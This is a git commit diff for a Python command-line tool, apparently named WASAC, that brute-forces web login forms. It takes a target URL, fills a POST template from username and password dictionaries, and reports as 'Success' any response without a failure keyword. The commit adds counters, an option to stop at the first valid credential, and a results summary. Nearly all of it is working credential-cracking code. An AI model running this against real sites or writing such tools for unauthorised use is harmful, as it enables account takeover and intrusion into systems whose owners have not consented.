7f3dfde48da356a017bee3fff9315d4ec62b7d49
Gr3yPh <lzx20100624@outlook.com>
2024-11-26 19:33:59 +0800

    main code

--- wasac.py
+++ wasac.py
@@ -1,6 +1,9 @@
 import argparse,requests,sys
 payload1='nothing'
 payload2='nothing'
+count=0
+fail_count=0
+success_count=0
 print(' __      __                               ')
 print('/  \\    /  \\_____    ___________    ____  ')
 print('\\   \\/\\/   /\\__  \\  /  ___/\\__  \\ _/ ___\\ ')
@@ -14,7 +17,8 @@ parser.add_argument('-t','--target',type=str,help='Target URL')
 parser.add_argument('--payload-count',type=int,help='Payload count (1 or 2)',default=1)
 parser.add_argument('-p1','--payload1',type=str,help='The path of the first payload\'s dictionary')
 parser.add_argument('-p2','--payload2',type=str,help='The path of the second payload\'s dictionary')
-parser.add_argument('-f','--format',type=str,help='POST Format (use dict() to set)')
+parser.add_argument('-f','--format',type=str,help='POST Format (replace payload position with ^P1^ and ^P2^)')
+parser.add_argument('-F','--First',action='store_true',help='Stop cracking as soon as the first valid payload is found')
 parser.add_argument('--grep-match',type=str,help='Flag items which contains grep-match value (The program will recognize this payload as failure if response contains this grep-match key word)',default='failed')
 args=parser.parse_args()
 
@@ -28,7 +32,9 @@ if args.target and args.payload_count:
                 except:
                     print('[-]Have trouble opening dictionary file, Please check if the file is valid.')
                     sys.exit(1)
+                    print('\n','*'*25,'\n')
                 for payload1 in f:
+                    count+=1
                     payload1=payload1.replace('\n', '').replace('\r', '')
                     data = args.format.replace('^P1^',payload1)
                     try:
@@ -39,10 +45,12 @@ if args.target and args.payload_count:
                         sys.exit(1)
                     if args.grep_match.encode() in response.content:
                         print('Payload: ',payload1,' Response length:',len(response.text),'  Failed')
-                        
+                        fail_count+=1
                     else:
                         print('Payload: ',payload1,' Response length:',len(response.text),'  Success')
-                        sys.exit(0)
+                        success_count+=1
+                        if args.First:
+                            break
                         
             else:
                 print('[-]Missing POST format or format is invalid. QUIT!')
@@ -56,8 +64,10 @@ if args.target and args.payload_count:
                 print('[*]Starting attack...')
                 f1=open(args.payload1,'r')
                 f2=open(args.payload2,'r')
+                print('\n','*'*25,'\n')
                 for payload1 in f1:
                     for payload2 in f2:
+                        count+=1
                         payload1=payload1.replace('\n', '').replace('\r', '')
                         payload2=payload2.replace('\n', '').replace('\r', '')
                         #data=eval(args.format)
@@ -70,10 +80,12 @@ if args.target and args.payload_count:
                             sys.exit(1)
                         if args.grep_match.encode() in response.content:
                             print('Payload: ',payload1,' and ',payload2,' Response length:',len(response.text),'  Failed')
-                            
+                            fail_count+=1
                         else:
                             print('Payload: ',payload1,' and ',payload2,' Response length:',len(response.text),' Success')
-                            sys.exit(0)
+                            success_count+=1
+                            if args.First:
+                                break
             else:
                 print('[-]Incorrect POST format. QUIT!')
                 sys.exit(1)
@@ -86,3 +98,9 @@ if args.target and args.payload_count:
 else:
     print('[-]Missing target URL or payload count. QUIT!')
     sys.exit(1)
+
+print('\n','*'*25,'\n')
+print('[+]Finished.')
+print('[*]Total ',str(count))
+print('[*]Success count ',str(success_count))
+print('[*]Failure count ',str(fail_count))
